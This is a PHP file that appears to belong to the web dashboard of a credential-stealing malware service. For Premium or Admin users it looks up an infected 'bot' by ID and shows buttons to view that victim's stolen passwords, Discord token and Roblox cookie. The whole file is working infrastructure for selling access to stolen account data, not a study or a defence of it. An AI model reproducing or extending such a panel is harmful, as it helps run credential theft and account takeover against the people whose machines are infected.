<?php
    @session_start();
    include_once 'includes/functions.php';
    include_once 'includes/checks.php';
     
    header('Content-type: application/json; charset=UTF-8');
        
    $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
    $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();

    if($getRank != "Premium"){
        if($getRank != "Admin"){
          header('Location: dashbord.php');
          die();
        }
      }
     

     if (isset($_POST['id']) && !empty($_POST['id'])){

        if($banned == 0){

          $get = pdoQuery($db, "SELECT * FROM `bots` WHERE `botID`=?", [htmlspecialchars($_POST['id'])]);
          $results = $get->fetchAll(PDO::FETCH_ASSOC);

          foreach($results as $result){
              $folder = htmlspecialchars($result['folder']);
              $botName = htmlspecialchars($result['botname']);

              echo "<form action='DLPW.php'><div class='d-flex justify-content-center bd-highlight mb-2 text-muted text-left'>
              <button type='submit' class='btn btn-outline-primary btn-sm m-0 waves-effect mr-2' name='getPasswords' value='$folder' style='width: 100%;'><i class='fas fa-key mr-2'></i> View Passwords</button>
              </div></form>";

              echo "<form method='POST'><div class='d-flex justify-content-center bd-highlight mb-2 text-muted text-left'>
              <button type='submit' class='btn btn-outline-primary btn-sm m-0 waves-effect mr-2' name='discordToken' value='$folder' style='width: 100%;'><i class='fab fa-discord mr-2'></i> View Discord Token</button>
              <input type='hidden' name='botUser' value='$botName' />
              </div></form>";

              echo "<form method='POST'><div class='d-flex justify-content-center bd-highlight mb-2 text-muted text-left'>
              <button type='submit' class='btn btn-outline-primary btn-sm m-0 waves-effect mr-2' name='robloxCookie' value='$folder' style='width: 100%;'><i class='fas fa-cookie-bite mr-2'></i> View Roblox Cookie</button>
              <input type='hidden' name='botUser' value='$botName' />
              </div></form>";

          }
        }else{
            echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left text-lightred'>
            <div class='p-2 bd-highlight'>You are banned. :'D</div>
            </div>";
        }
     }
?>